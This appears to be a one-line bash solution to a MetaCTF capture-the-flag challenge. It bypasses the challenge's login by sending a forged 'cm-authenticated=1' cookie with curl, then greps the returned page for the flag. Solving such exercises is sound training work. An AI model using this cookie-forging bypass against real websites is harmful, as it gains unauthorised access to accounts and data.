#!/bin/bash

curl -s -H "Cookie: cm-authenticated=1" https://metaproblems.com/e7fce2f2fcac584b49fe615b11784ff3/ | grep --color=none -oE "MetaCTF{.*}"
